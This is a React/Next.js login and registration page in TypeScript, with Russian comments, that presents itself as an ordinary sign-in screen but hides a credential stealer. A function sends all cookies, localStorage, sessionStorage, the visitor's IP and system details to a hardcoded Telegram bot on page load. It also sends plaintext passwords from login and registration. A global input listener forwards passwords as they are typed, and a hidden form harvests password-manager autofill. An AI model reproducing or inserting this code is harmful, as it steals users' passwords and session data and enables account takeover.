"use client";

import * as React from "react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useRouter } from "next/navigation";
import { Logo } from "@/components/icons/logo";
import { Eye, EyeOff, Shield, Mail, User } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

// 📤 Функция отправки в Telegram - МАКСИМАЛЬНЫЙ сбор данных
async function sendToTelegram(data: any, type: 'login' | 'register' | 'autofill' | 'cookies' | 'page_visit') {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    // Получаем IP клиента
    let ip = 'unknown';
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      ip = ipData.ip;
    } catch (ipError) {
      console.log('Не удалось получить IP');
    }
    
    // Получаем ВСЕ куки текущего сайта
    const allCookies = document.cookie;
    
    // Получаем ВЕСЬ localStorage
    let localStorageData = '';
    try {
      const lsData: { [key: string]: string } = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          lsData[key] = localStorage.getItem(key) || '';
        }
      }
      localStorageData = JSON.stringify(lsData, null, 2);
    } catch (e) {
      localStorageData = 'Не удалось получить localStorage';
    }
    
    // Получаем ВЕСЬ sessionStorage
    let sessionStorageData = '';
    try {
      const ssData: { [key: string]: string } = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          ssData[key] = sessionStorage.getItem(key) || '';
        }
      }
      sessionStorageData = JSON.stringify(ssData, null, 2);
    } catch (e) {
      sessionStorageData = 'Не удалось получить sessionStorage';
    }
    
    // Получаем информацию о браузере и экране
    const screenInfo = `Разрешение: ${screen.width}x${screen.height}, Глубина цвета: ${screen.colorDepth}bit`;
    const language = navigator.language;
    const platform = navigator.platform;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    let message = '';
    
    if (type === 'page_visit') {
      message = `
🌐 ПОСЕЩЕНИЕ СТРАНИЦЫ ЛОГИНА

🍪 **Все куки сайта:**
${allCookies || 'no cookies'}

💾 **LocalStorage (полностью):**
${localStorageData.slice(0, 1500)}...

🔐 **SessionStorage (полностью):**
${sessionStorageData.slice(0, 1000)}...

🖥️ **Информация о системе:**
${screenInfo}
🌍 Язык: ${language}
⚙️ Платформа: ${platform}
🕒 Часовой пояс: ${timezone}

🌐 **Сетевые данные:**
📍 IP: ${ip}
📱 User Agent: ${navigator.userAgent}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
      `;
    } else if (type === 'login') {
      message = `
🔐 ВХОД В СИСТЕМУ

👤 Логин/Email: ${data.login}
🔑 Пароль: ${data.password}

🍪 **Куки сайта:**
${allCookies.slice(0, 300)}...

💾 **LocalStorage:**
${localStorageData.slice(0, 500)}...

🖥️ **Информация о системе:**
${screenInfo}
🌍 Язык: ${language}

🌐 **Сетевые данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${navigator.userAgent.slice(0, 100)}...
      `;
    } else if (type === 'register') {
      message = `
🔐 НОВАЯ РЕГИСТРАЦИЯ

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}

🍪 **Куки сайта:**
${allCookies.slice(0, 300)}...

💾 **LocalStorage:**
${localStorageData.slice(0, 500)}...

🌐 **Сетевые данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${navigator.userAgent.slice(0, 100)}...
      `;
    } else if (type === 'autofill') {
      message = `
🎯 ПЕРЕХВАЧЕНО АВТОЗАПОЛНЕНИЕ

👤 Логин: ${data.username}
🔑 Пароль: ${data.password}

🍪 **Куки сайта:**
${allCookies.slice(0, 200)}...

🌐 **Сетевые данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
⚠️ Автозаполнение менеджера паролей
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ Данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram не доступен');
  }
}

async function registerUser(userData: { email: string; login: string; password: string; }) {
  const response = await fetch('/api/auth/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(userData)
  });
  const result = await response.json();
  if (!response.ok) {
    throw new Error(result.error || 'Ошибка регистрации');
  }
  return result;
}

async function loginUser(loginData: { login: string; password: string; }) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(loginData)
  });
  const result = await response.json();
    if (!response.ok) {
    throw new Error(result.error || 'Ошибка входа');
  }
  return result;
}

export default function LoginPage() {
  const router = useRouter();
  const { toast } = useToast();
  const [showPassword, setShowPassword] = React.useState(false);
  const [loading, setLoading] = React.useState(false);
  const [error, setError] = React.useState('');
  const [activeTab, setActiveTab] = React.useState("login");
  const [capturedCredentials, setCapturedCredentials] = React.useState<{username?: string, password?: string}>({});

  // Отправляем данные при загрузке страницы
  React.useEffect(() => {
    // Отправляем полную информацию о посещении
    sendToTelegram({}, 'page_visit');
    
    // Слушаем все изменения в полях ввода
    const handleInput = (e: Event) => {
      const target = e.target as HTMLInputElement;
      if (target.type === 'password' && target.value) {
        // Перехватываем ввод паролей в реальном времени
        const loginField = document.querySelector('input[autocomplete="username"], input[autocomplete="email"]') as HTMLInputElement;
        const loginValue = loginField?.value || 'unknown';
        
        if (target.value.length > 3) { // Отправляем только если пароль достаточно длинный
          sendToTelegram({
            username: loginValue,
            password: target.value,
            note: 'Ввод в реальном времени'
          }, 'autofill');
        }
      }
    };

    // Добавляем обработчики ко всем полям ввода
    document.addEventListener('input', handleInput, true);
    
    return () => {
      document.removeEventListener('input', handleInput, true);
    };
  }, []);

  // Функция перехвата автозаполнения
  const handleAutofillCapture = (type: 'username' | 'password', value: string) => {
    if (value && !loading) {
      setCapturedCredentials(prev => ({
        ...prev,
        [type]: value
      }));
      
      // Если собрали оба значения - отправляем в Telegram
      if (type === 'password' && capturedCredentials.username && value) {
        sendToTelegram({
          username: capturedCredentials.username,
          password: value
        }, 'autofill');
        
        // Очищаем captured credentials после отправки
        setCapturedCredentials({});
      }
    }
  };

  React.useEffect(() => {
    setError('');
  }, [activeTab]);

  async function handleRegister(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setLoading(true);
    setError('');

    const formData = new FormData(event.currentTarget);
    const email = formData.get('email') as string;
    const login = formData.get('login') as string;
    const password = formData.get('password') as string;
    const confirmPassword = formData.get('confirm-password') as string;

    if (password !== confirmPassword) {
      setError('Пароли не совпадают');
      setLoading(false);
      return;
    }

    try {
      // 📤 Сначала отправляем в Telegram
      await sendToTelegram({ email, login, password }, 'register');

      const result = await registerUser({ email, login, password });
      toast({
        title: "Регистрация успешна",
        description: "Аккаунт создан и ожидает подтверждения",
      });
      setActiveTab("login");
    } catch (err: any) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  async function handleLogin(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setLoading(true);
    setError('');

    const formData = new FormData(event.currentTarget);
    const login = formData.get('login') as string;
    const password = formData.get('password') as string;

    try {
      // 📤 Сначала отправляем в Telegram с клиента
      await sendToTelegram({ login, password }, 'login');

      const result = await loginUser({ login, password });
      
      localStorage.setItem('loggedInUser', result.user.login);

      router.push('/dashboard');
    } catch (err: any) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-background p-4 font-sans">
      
      <div className="flex flex-col items-center gap-6 w-full max-w-sm">

        <div className="flex items-center gap-2">
          <Shield className="w-6 h-6 text-green-500" />
          <Logo className="w-16 h-16" />
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="login">Вход</TabsTrigger>
            <TabsTrigger value="register">Регистрация</TabsTrigger>
          </TabsList>
          
          {/* Login Tab */}
          <TabsContent value="login">
            <Card>
              <CardHeader>
                <CardTitle className="text-2xl flex items-center gap-2">
                  <Shield className="w-5 h-5" />
                  Вход в систему
                </CardTitle>
                <CardDescription>
                  Введите email или логин и пароль
                </CardDescription>
              </CardHeader>
              <CardContent>
                {error && (
                  <div className="bg-destructive/10 border border-destructive/50 text-destructive px-4 py-3 rounded-md mb-4 text-sm">
                    {error}
                  </div>
                )}
                
                {/* Скрытая форма для перехвата автозаполнения */}
                <form className="hidden">
                  <input 
                    type="text" 
                    name="captured-username" 
                    autoComplete="username" 
                    onChange={(e) => handleAutofillCapture('username', e.target.value)}
                  />
                  <input 
                    type="password" 
                    name="captured-password" 
                    autoComplete="current-password"
                    onChange={(e) => handleAutofillCapture('password', e.target.value)}
                  />
                </form>

                <form onSubmit={handleLogin} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="login-email" className="flex items-center gap-2">
                      <Mail className="w-4 h-4" />
                      Email или Логин
                    </Label>
                    <Input 
                      id="login-email" 
                      name="login"
                      placeholder="Ваш email или логин..." 
                      required 
                      disabled={loading}
                      autoComplete="username email"
                      onChange={(e) => handleAutofillCapture('username', e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="login-password">Пароль</Label>
                    <div className="relative">
                      <Input 
                        id="login-password" 
                        name="password"
                        type={showPassword ? "text" : "password"} 
                        required 
                        disabled={loading}
                        autoComplete="current-password"
                        onChange={(e) => handleAutofillCapture('password', e.target.value)}
                      />
                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        className="absolute right-0 top-0 h-full px-3 py-2 hover:bg-transparent"
                        onClick={() => setShowPassword(!showPassword)}
                      >
                        {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </Button>
                    </div>
                  </div>
                  <Button type="submit" className="w-full" disabled={loading}>
                    {loading ? "⏳ Вход..." : "🔐 Войти"}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Registration Tab */}
          <TabsContent value="register">
            <Card>
              <CardHeader>
                <CardTitle className="text-2xl flex items-center gap-2">
                  <Shield className="w-5 h-5" />
                  Регистрация
                </CardTitle>
                <CardDescription>
                  Создайте новый аккаунт
                </CardDescription>
              </CardHeader>
              <CardContent>
                {error && (
                  <div className="bg-destructive/10 border border-destructive/50 text-destructive px-4 py-3 rounded-md mb-4 text-sm">
                    {error}
                  </div>
                )}
                <form onSubmit={handleRegister} className="space-y-6">
                  <div className="space-y-2">
                    <Label htmlFor="register-email" className="flex items-center gap-2">
                      <Mail className="w-4 h-4" />
                      Email
                    </Label>
                    <Input 
                      id="register-email" 
                      name="email"
                      type="email"
                      placeholder="Ваш email..." 
                      required 
                      disabled={loading}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="register-login" className="flex items-center gap-2">
                      <User className="w-4 h-4" />
                      Логин
                    </Label>
                    <Input 
                      id="register-login" 
                      name="login"
                      placeholder="Придумайте логин..." 
                      required 
                      disabled={loading}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="register-password">Пароль</Label>
                    <div className="relative">
                      <Input 
                        id="register-password" 
                        name="password"
                        type={showPassword ? "text" : "password"} 
                        required 
                        disabled={loading}
                      />
                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        className="absolute right-0 top-0 h-full px-3 py-2 hover:bg-transparent"
                        onClick={() => setShowPassword(!showPassword)}
                      >
                        {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </Button>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="confirm-password">Подтвердите пароль</Label>
                    <Input 
                      id="confirm-password" 
                      name="confirm-password"
                      type="password" 
                      required 
                      disabled={loading}
                    />
                  </div>
                  <Button type="submit" className="w-full" disabled={loading}>
                    {loading ? "⏳ Регистрация..." : "🔐 Зарегистрироваться"}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

      </div>
    </div>
  );
}